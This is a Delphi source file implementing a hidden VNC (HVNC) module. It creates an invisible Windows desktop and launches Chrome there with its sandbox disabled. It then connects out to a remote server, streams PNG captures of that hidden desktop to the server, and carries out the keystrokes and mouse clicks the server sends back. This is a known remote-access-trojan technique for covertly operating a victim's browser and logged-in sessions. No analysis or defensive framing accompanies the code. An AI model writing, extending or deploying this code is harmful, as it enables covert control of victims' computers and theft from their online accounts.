unit HVNC;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Classes, Vcl.Graphics,
  Winapi.WinSock2, Winapi.WinInet, Vcl.Imaging.jpeg, Vcl.Imaging.pngimage,
  Winapi.ActiveX, System.Win.ComObj;

const
  WS_EX_COMPOSITED = $02000000;
  GW_HWNDLAST = 1;
  GW_HWNDPREV = 3;
  // WinSock constants
  AF_INET = 2;
  SOCK_STREAM = 1;
  IPPROTO_TCP = 6;
  MSG_WAITALL = 8;
  // GDI+ Status constants
  OK = 0;
  S_OK = 0;

// GDI+ function declarations
type
  TGdiplusStartupInput = record
    GdiplusVersion: Cardinal;
    DebugEventCallback: Pointer;
    SuppressBackgroundThread: BOOL;
    SuppressExternalCodecs: BOOL;
  end;
  PGdiplusStartupInput = ^TGdiplusStartupInput;

// External function declarations
function GdiplusStartup(out Token: ULONG_PTR; Input: Pointer; Output: Pointer): Integer; stdcall; external 'gdiplus.dll';
function GdiplusShutdown(Token: ULONG_PTR): Integer; stdcall; external 'gdiplus.dll';
function GdipCreateBitmapFromHBITMAP(hbm: HBITMAP; hpal: HPALETTE; out bitmap: Pointer): Integer; stdcall; external 'gdiplus.dll';
function GdipSaveImageToStream(image: Pointer; stream: IStream; clsidEncoder: Pointer; encoderParams: Pointer): Integer; stdcall; external 'gdiplus.dll';
function GdipDisposeImage(image: Pointer): Integer; stdcall; external 'gdiplus.dll';
function GetImageEncodersSize(out numEncoders: UINT; out size: UINT): Integer; stdcall; external 'gdiplus.dll';
function GetImageEncoders(numEncoders: UINT; size: UINT; encoders: Pointer): Integer; stdcall; external 'gdiplus.dll';
function PrintWindow(hwnd: HWND; hdcBlt: HDC; nFlags: UINT): BOOL; stdcall; external 'user32.dll';
function CreateThread(lpThreadAttributes: Pointer; dwStackSize: SIZE_T;
  lpStartAddress: TFNThreadStartRoutine; lpParameter: Pointer; dwCreationFlags: DWORD;
  var lpThreadId: DWORD): THandle; stdcall; external kernel32;

  type
  THVNCInputThread = class(TThread)
  protected
    procedure Execute; override;
  end;
type
  THiddenVNC = class
  private
    FDesktopName: string;
    FDesktopHandle: HDESK;
    FServerIP: string;
    FServerPort: string;
    FSocket: TSocket;
    FSendFrame: Boolean;
    FFullFrame: Boolean;
    FPastBitmap: Pointer;
    FTerminate: Boolean;
    FInputThread: THandle;

    function InitializeSocket: Boolean;
    function SendData(const Data: Pointer; Len, X, Y: Integer): Boolean;
    function ReceiveData: Pointer;
    procedure RunProcess(const DesktopName, Path: string);
    procedure InputThreadProc;
    function BitmapToPng(HBitmap: HBITMAP; var Size: Integer): Pointer;
    function GetEncoderClsid(const MimeType: string; var Clsid: TGUID): Boolean;
  public
    constructor Create(const ServerIP, ServerPort, DesktopName: string);
    destructor Destroy; override;
    procedure Execute;
  end;

function InputThreadProc(Parameter: Pointer): DWORD; stdcall;

implementation

var
  GlobalHVNC: THiddenVNC = nil;

function InputThreadProc(Parameter: Pointer): DWORD; stdcall;
begin
  if GlobalHVNC <> nil then
    GlobalHVNC.InputThreadProc;
  Result := 0;
end;

{ THiddenVNC }

constructor THiddenVNC.Create(const ServerIP, ServerPort, DesktopName: string);
begin
  inherited Create;
  FServerIP := ServerIP;
  FServerPort := ServerPort;
  FDesktopName := DesktopName;
  FTerminate := False;
  FPastBitmap := nil;
  FSendFrame := False;
  FFullFrame := False;
  GlobalHVNC := Self;
end;

destructor THiddenVNC.Destroy;
begin
  FTerminate := True;

  if FDesktopHandle <> 0 then
    CloseDesktop(FDesktopHandle);

  if FInputThread <> 0 then
  begin
    WaitForSingleObject(FInputThread, 1000);
    CloseHandle(FInputThread);
  end;

  if FPastBitmap <> nil then
    FreeMem(FPastBitmap);

  closesocket(FSocket);
  WSACleanup;

  GlobalHVNC := nil;

  inherited;
end;

procedure THiddenVNC.RunProcess(const DesktopName, Path: string);
var
  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
  CmdLine: array[0..1023] of Char;
begin
  ZeroMemory(@StartupInfo, SizeOf(StartupInfo));
  ZeroMemory(@ProcessInfo, SizeOf(ProcessInfo));
  StartupInfo.cb := SizeOf(StartupInfo);
  StartupInfo.lpDesktop := PChar(DesktopName);

  StrCopy(CmdLine, PChar(Path));
  CreateProcess(nil, CmdLine, nil, nil, False, 0, nil, nil, StartupInfo, ProcessInfo);

  // Close handles
  if ProcessInfo.hProcess <> 0 then
    CloseHandle(ProcessInfo.hProcess);
  if ProcessInfo.hThread <> 0 then
    CloseHandle(ProcessInfo.hThread);
end;

function THiddenVNC.InitializeSocket: Boolean;
var
  WSAData: TWSAData;
  SockAddr: TSockAddrIn;
  HostEntry: PHostEnt;
  IPAddress: AnsiString;
begin
  Result := False;

  if WSAStartup($0202, WSAData) <> 0 then
    Exit;

  // Create socket
  FSocket := socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if FSocket = INVALID_SOCKET then
  begin
    WSACleanup;
    Exit;
  end;

  // Prepare sockaddr_in structure
  ZeroMemory(@SockAddr, SizeOf(SockAddr));
  SockAddr.sin_family := AF_INET;
  SockAddr.sin_port := htons(StrToIntDef(FServerPort, 6968));

  // Convert IP address
  IPAddress := AnsiString(FServerIP);
  SockAddr.sin_addr.S_addr := inet_addr(PAnsiChar(IPAddress));

  // If not a valid IP address, try to resolve hostname
  if SockAddr.sin_addr.S_addr = INADDR_NONE then
  begin
    HostEntry := gethostbyname(PAnsiChar(IPAddress));
    if HostEntry = nil then
    begin
      closesocket(FSocket);
      WSACleanup;
      Exit;
    end;
    SockAddr.sin_addr.S_addr := PInteger(HostEntry.h_addr_list^)^;
  end;

  // Connect to server
  if connect(FSocket, TSockAddr(SockAddr), SizeOf(SockAddr)) = SOCKET_ERROR then
  begin
    closesocket(FSocket);
    WSACleanup;
    Exit;
  end;

  Result := True;
end;

function THiddenVNC.SendData(const Data: Pointer; Len, X, Y: Integer): Boolean;
var
  SendBuffer: Pointer;
  TotalSize: Integer;
  BytesSent: Integer;
begin
  Result := False;
  TotalSize := Len + 12;

  GetMem(SendBuffer, TotalSize);
  try
    // Fill the header
    PInteger(SendBuffer)^ := Len;
    PInteger(NativeUInt(SendBuffer) + 4)^ := X;
    PInteger(NativeUInt(SendBuffer) + 8)^ := Y;

    // Copy the data
    Move(Data^, Pointer(NativeUInt(SendBuffer) + 12)^, Len);

    BytesSent := send(FSocket, SendBuffer^, TotalSize, 0);
    if BytesSent = SOCKET_ERROR then
    begin
      closesocket(FSocket);
      WSACleanup;
      Exit;
    end;

    Result := True;
  finally
    FreeMem(SendBuffer);
  end;
end;

function THiddenVNC.ReceiveData: Pointer;
var
  Buffer: Pointer;
  RecvResult: Integer;
begin
  Result := nil;

  GetMem(Buffer, 9);
  try
    RecvResult := recv(FSocket, Buffer^, 9, MSG_WAITALL);

    if RecvResult <= 0 then
    begin
      FreeMem(Buffer);
      closesocket(FSocket);
      WSACleanup;
      Exit;
    end;

    Result := Buffer;
  except
    FreeMem(Buffer);
    raise;
  end;
end;

procedure THiddenVNC.InputThreadProc;
var
  Data: Pointer;
  KeyCode: Integer;
  X, Y: Integer;
  Point: TPoint;
  HWnd, TopWindow: THandle;
  LParam: NativeInt;
begin
  SetThreadDesktop(FDesktopHandle);
  TopWindow := GetTopWindow(0);

  while not FTerminate do
  begin
    Data := ReceiveData;
    if Data = nil then
      Break;

    case PByte(Data)^ of
      $69: // Key press
      begin
        KeyCode := PInteger(NativeUInt(Data) + 1)^;
        PostMessage(TopWindow, WM_KEYDOWN, KeyCode, 0);
        OutputDebugString(PChar(Format('Keypress %x', [KeyCode])));
      end;

      $71: // Mouse click
      begin
        X := PInteger(NativeUInt(Data) + 1)^;
        Y := PInteger(NativeUInt(Data) + 5)^;

        Point.X := X;
        Point.Y := Y;
        HWnd := WindowFromPoint(Point);

        // Find the appropriate child window
        while True do
        begin
          TopWindow := HWnd;
          ScreenToClient(HWnd, Point);
          HWnd := ChildWindowFromPoint(TopWindow, Point);

          if (HWnd = 0) or (HWnd = TopWindow) then
            Break;
        end;

        OutputDebugString(PChar(Format('Click %d, %d', [X, Y])));
        LParam := MakeLParam(Point.X, Point.Y);
        PostMessage(TopWindow, WM_LBUTTONDOWN, 0, LParam);
        Sleep(10);
        PostMessage(TopWindow, WM_LBUTTONUP, 0, LParam);
      end;

      $67: // Full frame request
      begin
        FFullFrame := True;
      end;
    end;

    FSendFrame := True;
    FreeMem(Data);
  end;
end;

function THiddenVNC.GetEncoderClsid(const MimeType: string; var Clsid: TGUID): Boolean;
var
  NumEncoders, Size, I: UINT;
  ImageCodecInfo: Pointer;
  CodecPtr: Pointer;
  MimeTypeStr: string;
  TempClsid: TGUID;
begin
  Result := False;
  FillChar(TempClsid, SizeOf(TempClsid), 0);

  // Get the size needed for the encoder info
  if GetImageEncodersSize(NumEncoders, Size) <> 0 then
    Exit;

  if Size = 0 then
    Exit;

  GetMem(ImageCodecInfo, Size);
  try
    // Get the encoder information
    if GetImageEncoders(NumEncoders, Size, ImageCodecInfo) <> 0 then
      Exit;

    // For each encoder, check if it matches the requested MIME type
    for I := 0 to NumEncoders - 1 do
    begin
      // Calculate the pointer to the current codec info
      CodecPtr := Pointer(NativeUInt(ImageCodecInfo) + I * 76); // Approx size of TImageCodecInfo

      // Extract the MIME type and compare
      if PWideChar(NativeUInt(CodecPtr) + 56) <> nil then // Offset to MimeType
      begin
        MimeTypeStr := PWideChar(NativeUInt(CodecPtr) + 56);
        if SameText(MimeTypeStr, MimeType) then
        begin
          // Copy the CLSID (first item in structure)
          Move(CodecPtr^, TempClsid, SizeOf(TGUID));
          Clsid := TempClsid;
          Result := True;
          Break;
        end;
      end;
    end;
  finally
    FreeMem(ImageCodecInfo);
  end;
end;
function THiddenVNC.BitmapToPng(HBitmap: HBITMAP; var Size: Integer): Pointer;
var
  Bitmap: TBitmap;
  PNG: TPngImage;
  Stream: TMemoryStream;
  CompressionLevel: Integer;
begin
  Result := nil;
  Size := 0;
  Bitmap := TBitmap.Create;
  PNG := TPngImage.Create;
  Stream := TMemoryStream.Create;
  try

    Bitmap.Handle := HBitmap;


    PNG.Assign(Bitmap);


    CompressionLevel := 7;
    PNG.CompressionLevel := CompressionLevel;




    PNG.SaveToStream(Stream);


    Size := Stream.Size;
    GetMem(Result, Size);

    // Copy the data
    Stream.Position := 0;
    Stream.ReadBuffer(Result^, Size);
  finally
    Stream.Free;
    PNG.Free;
    Bitmap.Free;
  end;
end;
 procedure THVNCInputThread.Execute;
begin
  if GlobalHVNC <> nil then
    GlobalHVNC.InputThreadProc;
end;
procedure THiddenVNC.Execute;
var
  Rect: TRect;
  ScreenDC: HDC;
  MemDC: HDC;
  HBmp: HBITMAP;
  Bitmap: Pointer;
  CurWindow, LastWindow: HWND;
  WRect: TRect;
  WinDC: HDC;
  WinBitmap: HBITMAP;
  BitsPerPixel: Integer;
  BitsSize: DWORD;
  Top, Left, Bottom, Right: Integer;
  TopSet: Boolean;
  X, Y: Integer;
  i: Integer;
  NewDC: HDC;
  NewBitmap: HBITMAP;
  PngData: Pointer;
  PngSize: Integer;
  ThreadID: DWORD;
  var
  Thread: THVNCInputThread;
begin
  // Open or create the desktop
  FDesktopHandle := OpenDesktop(PChar(FDesktopName), 0, False, GENERIC_ALL);
  if FDesktopHandle = 0 then
    FDesktopHandle := CreateDesktop(PChar(FDesktopName), nil, nil, 0, GENERIC_ALL, nil);

  SetThreadDesktop(FDesktopHandle);

  // Start Chrome (or any other application)
  RunProcess(FDesktopName, 'cmd.exe /c "start /max chrome.exe --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11"');
  Sleep(1000);

  // Initialize socket connection
  if not InitializeSocket then
    Exit;

  // Create input thread
   Thread := THVNCInputThread.Create(False); // False means start immediately
  FInputThread := Thread.Handle;

  // Get desktop dimensions
  GetWindowRect(GetDesktopWindow, Rect);
  ScreenDC := GetDC(0);

  // Allocate memory for past bitmap
  GetMem(FPastBitmap, 10000000);
  FillChar(FPastBitmap^, 10000000, 0);

  try
    FSendFrame := True; // Start with a frame request

    // Main loop
    while not FTerminate do
    begin
      while not FSendFrame do
        Sleep(10);

      FSendFrame := False;

      // Create compatible DC and bitmap
      MemDC := CreateCompatibleDC(ScreenDC);
      HBmp := CreateCompatibleBitmap(ScreenDC, Rect.Right, Rect.Bottom);
      SelectObject(MemDC, HBmp);

      // Set WS_EX_COMPOSITED on all visible windows
      CurWindow := GetWindow(GetTopWindow(0), GW_HWNDLAST);
      LastWindow := CurWindow;

      while CurWindow <> 0 do
      begin
        if IsWindowVisible(CurWindow) then
          SetWindowLong(CurWindow, GWL_EXSTYLE, GetWindowLong(CurWindow, GWL_EXSTYLE) or WS_EX_COMPOSITED);

        CurWindow := GetWindow(CurWindow, GW_HWNDPREV);
      end;

      Sleep(20);
      CurWindow := LastWindow;

      // Render all visible windows
      while CurWindow <> 0 do
      begin
        if IsWindowVisible(CurWindow) then
        begin
          GetWindowRect(CurWindow, WRect);
          WinDC := CreateCompatibleDC(ScreenDC);
          WinBitmap := CreateCompatibleBitmap(ScreenDC, Rect.Right - Rect.Left, Rect.Bottom - Rect.Top);
          SelectObject(WinDC, WinBitmap);

          if PrintWindow(CurWindow, WinDC, 0) then
            BitBlt(MemDC, WRect.Left, WRect.Top, WRect.Right - WRect.Left, WRect.Bottom - WRect.Top, WinDC, 0, 0, SRCCOPY);

          SetWindowLong(CurWindow, GWL_EXSTYLE, GetWindowLong(CurWindow, GWL_EXSTYLE) and not WS_EX_COMPOSITED);
          DeleteObject(WinBitmap);
          DeleteDC(WinDC);
        end;

        CurWindow := GetWindow(CurWindow, GW_HWNDPREV);
      end;

      // Allocate memory for bitmap data
      GetMem(Bitmap, 10000000);
      try
        BitsSize := GetBitmapBits(HBmp, 10000000, Bitmap);
        if BitsSize > 0 then
          BitsPerPixel := BitsSize div (Rect.Right * Rect.Bottom)
        else
          BitsPerPixel := 4; // Default to 32-bit

        // Reset boundaries
        Top := 0;
        TopSet := False;
        Left := Rect.Right;
        Bottom := 0;
        Right := 0;

        // Full frame or calculate changed region
        if FFullFrame then
        begin
          FillChar(FPastBitmap^, 10000000, 0);
          FFullFrame := False;

          // For full frame, use whole screen dimensions
          Left := 0;
          Top := 0;
          Right := Rect.Right;
          Bottom := Rect.Bottom;
          TopSet := True;
        end
        else
        begin
          // Find changed region
          i := 0;
          while i < Integer(BitsSize) do
          begin
            if not CompareMem(
               PByte(NativeUInt(FPastBitmap) + Cardinal(i)),
               PByte(NativeUInt(Bitmap) + Cardinal(i)),
               BitsPerPixel) then
            begin
              Y := i div (BitsPerPixel * Rect.Right);

              if not TopSet then
              begin
                Top := Y;
                TopSet := True;
              end;

              X := (i div BitsPerPixel) mod Rect.Right;

              if X < Left then Left := X;
              if X > Right then Right := X;
              if Y > Bottom then Bottom := Y;
            end;
            Inc(i, BitsPerPixel);
          end;

          // Adjust boundaries
          if Left = Rect.Right then Left := 0;
          Inc(Bottom);
          Inc(Right);

          if Bottom > Rect.Bottom then Bottom := Rect.Bottom;
          if Right > Rect.Right then Right := Rect.Right;
        end;

        // Replace past bitmap with current
        FreeMem(FPastBitmap);
        FPastBitmap := Bitmap;
        Bitmap := nil;

        // Bitblt the changed rectangle
        NewDC := CreateCompatibleDC(ScreenDC);
        NewBitmap := CreateCompatibleBitmap(ScreenDC, Right - Left, Bottom - Top);
        SelectObject(NewDC, NewBitmap);
        BitBlt(NewDC, 0, 0, Right - Left, Bottom - Top, MemDC, Left, Top, SRCCOPY);

        // Clean up
        DeleteObject(HBmp);
        DeleteDC(MemDC);

        // Convert to PNG and send
        PngSize := 0;
        PngData := BitmapToPng(NewBitmap, PngSize);

        if PngData <> nil then
        begin
          if not SendData(PngData, PngSize, Left, Top) then
            Break;

          FreeMem(PngData);
        end;

        DeleteObject(NewBitmap);
        DeleteDC(NewDC);
      except
        if Bitmap <> nil then
          FreeMem(Bitmap);
        raise;
      end;
    end;
  finally
    if FPastBitmap <> nil then
    begin
      FreeMem(FPastBitmap);
      FPastBitmap := nil;
    end;

    ReleaseDC(0, ScreenDC);
  end;
end;

end.